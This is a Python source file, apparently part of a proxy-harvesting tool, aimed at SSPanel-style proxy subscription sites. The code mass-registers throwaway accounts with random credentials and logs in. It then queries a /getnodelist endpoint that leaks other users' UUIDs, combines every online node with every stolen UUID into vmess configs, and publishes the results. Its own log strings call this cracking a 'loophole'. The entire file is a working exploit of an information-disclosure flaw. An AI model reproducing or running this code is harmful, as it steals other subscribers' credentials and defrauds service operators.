# -*- coding: utf-8 -*-

# @Author  : wzdnzd
# @Time    : 2022-05-20

import itertools
import json
import random
import re
import urllib
import urllib.parse
import urllib.request
import warnings
from copy import deepcopy

import push
import utils
import yaml
from logger import logger

warnings.filterwarnings("ignore")

HEADER = {
    "user-agent": utils.USER_AGENT,
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "zh-CN,zh;q=0.9",
    "dnt": "1",
    "Connection": "keep-alive",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
}


"""
原理: https://bulianglin.com/archives/getnodelist.html
"""


def convert(chars: bytes) -> list:
    if chars is None or b"" == chars:
        return []
    try:
        contents = json.loads(chars).get("nodeinfo", None)
        if not contents:
            logger.error(f"[ScanerConvertError] cannot fetch node list, response: {chars}")
            return []

        nodes_muport = contents["nodes_muport"]
        if not nodes_muport:
            return []

        uuids = set()
        for nm in nodes_muport:
            user = nm.get("user", None)
            if not user or not user.get("uuid", ""):
                continue

            uuids.add(user.get("uuid").strip())

        arrays, uuids = [], list(uuids)
        nodes = contents["nodes"]
        for node in nodes:
            # server offline
            if node["online"] == -1:
                continue

            for uuid in uuids:
                try:
                    result = parse_vmess(node["raw_node"], uuid)
                    if result:
                        arrays.append(result)
                except:
                    pass
        return arrays
    except Exception as e:
        logger.error("[ScanerConvertError] convert failed: {}".format(str(e)))
        return []


def parse_vmess(node: dict, uuid: str) -> dict:
    if not uuid:
        return None

    result = {
        "name": node.get("name"),
        "type": "vmess",
        "uuid": uuid,
        "cipher": "auto",
        "skip-cert-verify": True,
    }

    server = node.get("server")
    items = server.split(";")
    result["alterId"] = int(items[2])

    network = items[3].strip()
    if network == "" or "tls" in network:
        network = items[4].strip()
    result["network"] = network
    result["tls"] = "tls" in items[3] or "tls" in items[4]

    host = items[0]
    port = int(items[1])

    if len(items) > 5:
        obfs = items[5]
        opts = {}
        if obfs != None and obfs.strip() != "":
            for s in obfs.split("|"):
                words = s.split("=")
                if len(words) != 2:
                    continue

                if words[0] == "server":
                    host = words[1]
                elif words[0] == "outside_port":
                    port = int(words[1])
                elif words[0] == "path":
                    opts["path"] = words[1]
                elif words[0] == "host":
                    opts["headers"] = {"Host": words[1]}

        if opts:
            result["ws-opts"] = opts

    result["server"] = host
    result["port"] = port
    return result


def login(url, params, headers, retry) -> str:
    try:
        data = urllib.parse.urlencode(params).encode(encoding="UTF8")
        request = urllib.request.Request(url, data=data, headers=headers, method="POST")

        response = urllib.request.urlopen(request, timeout=10, context=utils.CTX)
        if response.getcode() == 200:
            return response.getheader("Set-Cookie")
        else:
            logger.info(
                "[ScanerLoginError] domain: {}, message: {}".format(url, response.read().decode("unicode_escape"))
            )
            return ""
    except Exception as e:
        logger.error("[ScanerLoginError] doamin: {}, message: {}".format(url, str(e)))

        retry -= 1
        return login(url, params, headers, retry) if retry > 0 else ""


def register(url: str, params: dict, retry: int) -> bool:
    try:
        data = urllib.parse.urlencode(params).encode(encoding="UTF8")
        request = urllib.request.Request(url, data=data, method="POST", headers=HEADER)

        response = urllib.request.urlopen(request, timeout=10, context=utils.CTX)
        if response.getcode() == 200:
            content = response.read()
            kv = json.loads(content)
            if "ret" in kv and kv["ret"] == 1:
                return True

        logger.debug(
            "[ScanerRegisterError] domain: {}, message: {}".format(url, response.read().decode("unicode_escape"))
        )
        return False
    except Exception as e:
        logger.error("[ScanerRegisterError] domain: {}, message: {}".format(url, str(e)))

        retry -= 1
        return register(url, params, retry) if retry > 0 else False


def get_cookie(text) -> str:
    regex = "(__cfduid|uid|email|key|ip|expire_in)=(.+?);"
    if not text:
        return ""

    content = re.findall(regex, text)
    cookie = ";".join(["=".join(x) for x in content]).strip()

    return cookie


def fetch_nodes(
    domain: str,
    email: str,
    passwd: str,
    headers: dict = None,
    retry: int = 3,
    subflag: bool = False,
) -> bytes:
    headers = deepcopy(HEADER) if not headers else headers
    login_url = domain + "/auth/login"
    headers["origin"] = domain
    headers["referer"] = login_url
    user_info = {"email": email, "passwd": passwd}

    text = login(login_url, user_info, headers, 3)
    cookie = get_cookie(text)
    if not text or len(cookie) <= 0:
        return None

    headers["cookie"] = cookie
    content = None
    while retry > 0 and not content:
        retry -= 1
        try:
            url = f"{domain}/getuserinfo" if subflag else f"{domain}/getnodelist"
            request = urllib.request.Request(url=url, headers=headers)
            response = urllib.request.urlopen(request, timeout=10, context=utils.CTX)
            if response.getcode() == 200:
                content = response.read()
                break
            else:
                logger.info(
                    "[ScanerFetchError] domain: {}, message: {}".format(
                        domain, response.read().decode("unicode_escape")
                    )
                )
        except Exception as e:
            logger.error("[ScanerFetchError] domain: {}, message: {}".format(domain, str(e)))

    return content


def check(domain: str) -> bool:
    try:
        content = utils.http_get(url=domain + "/getnodelist", headers=HEADER)
        if content:
            data = json.loads(content)
            return "ret" in data and data["ret"] == -1
    except:
        pass

    return False


def get_payload(email: str, passwd: str) -> dict:
    if not email:
        email = utils.random_chars(length=8, punctuation=False) + "@gmail.com"
    if not passwd:
        passwd = utils.random_chars(length=10, punctuation=True)

    return {
        "name": email.split("@")[0],
        "email": email,
        "passwd": passwd,
        "repasswd": passwd,
        "tos": True,
        "imtype": "1",
        "wechat": utils.random_chars(length=8, punctuation=False),
    }


def scanone(domain: str, email: str, passwd: str) -> list:
    # 获取机场所有节点信息
    content = get_userinfo(domain=domain, email=email, passwd=passwd, subflag=False, verify=True)

    # 解析节点
    proxies = convert(content)

    logger.info("[ScanerInfo] found {} nodes, domain: {}".format(len(proxies), domain))
    return proxies


def getsub(domain: str, email: str, passwd: str) -> str:
    # 获取用户信息
    content = get_userinfo(domain=domain, email=email, passwd=passwd, subflag=True, verify=False)

    if content is None or b"" == content:
        logger.error("[ScanerInfo] cannot found subscribe url, domain: {}".format(domain))
        return ""
    try:
        data = json.loads(content).get("info", {})
        suburl = data.get("subUrl", "")
        subtoken = data.get("ssrSubToken", "")
        if utils.isblank(suburl) or utils.isblank(subtoken):
            logger.error("[ScanerInfo] subUrl or subToken is empty, domain: {}".format(domain))
            return ""

        return suburl + subtoken
    except Exception as e:
        logger.error("[ScanerError] extract subUrl error: {}".format(str(e)))
        return ""


def get_userinfo(domain: str, email: str, passwd: str, subflag: bool, verify: bool = False) -> str:
    if utils.isblank(domain) or utils.isblank(email) or utils.isblank(passwd):
        logger.error(f"[ScanerError] skip scan because found invalidate arguments, domain: {domain}")
        return ""

    # 检测是否符合条件
    if verify and not check(domain):
        logger.info("[ScanerError] cannot crack, domain: {}".format(domain))
        return ""

    register_url = domain + "/auth/register"
    params = get_payload(email=email, passwd=passwd)

    # 注册失败后不立即返回 因为可能已经注册过
    if not register(register_url, params, 3):
        logger.debug("[ScanerInfo] register failed, domain: {}".format(domain))

    # 获取机场所有节点信息
    return fetch_nodes(domain=domain, email=email, passwd=passwd, subflag=subflag)


def filter_task(tasks: dict) -> list:
    if not tasks or type(tasks) != dict:
        return []

    configs = []
    for k, v in tasks.items():
        domain = utils.extract_domain(k, include_protocal=True)
        if not domain or type(v) != dict or not v.pop("enable", True):
            continue

        email, password = v.pop("email", ""), v.pop("password", "")
        if utils.isblank(email) or utils.isblank(password):
            chars = utils.random_chars(length=random.randint(8, 10), punctuation=False)
            # email = email if re.match(r"^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$", email) else chars + "@gmail.com"

            email = chars + "@gmail.com" if utils.isblank(email) else email
            password = chars if utils.isblank(password) else password

        configs.append([domain, email, password])

    return configs


def scan(params: dict) -> list:
    if not params or type(params) != dict:
        return []

    tasks = filter_task(tasks=params.get("tasks", {}))
    if not tasks:
        logger.info(f"[ScanerError] skip scan because not found validate task")
        return []

    config = params.get("config", {})
    persist = params.get("persist", {})
    pushtool = push.get_instance(engine=params.get("engine", ""))

    if not pushtool.validate(push_conf=persist) or not config or type(config) != dict or not config.get("push_to"):
        logger.error(f"[ScanerError] cannot scan proxies bcause missing some parameters")
        return []

    results = utils.multi_process_run(func=scanone, tasks=tasks)
    proxies = list(itertools.chain.from_iterable(results))
    if proxies:
        content = yaml.dump(data={"proxies": proxies}, allow_unicode=True)
        pushtool.push_to(
            content=content,
            push_conf=persist,
            group="scaner",
        )
    else:
        domains = ",".join(x[0] for x in tasks)
        logger.info(f"[ScanerError] cannot found any proxies, domains=[{domains}]")

    config["sub"] = [pushtool.raw_url(push_conf=persist)]
    config["name"] = "loophole" if not config.get("name", "") else config.get("name")
    config["push_to"] = list(set(config["push_to"]))
    config["saved"] = True

    logger.info(f"[ScanerInfo] scan finished, found {len(proxies)} proxies")
    return [config]
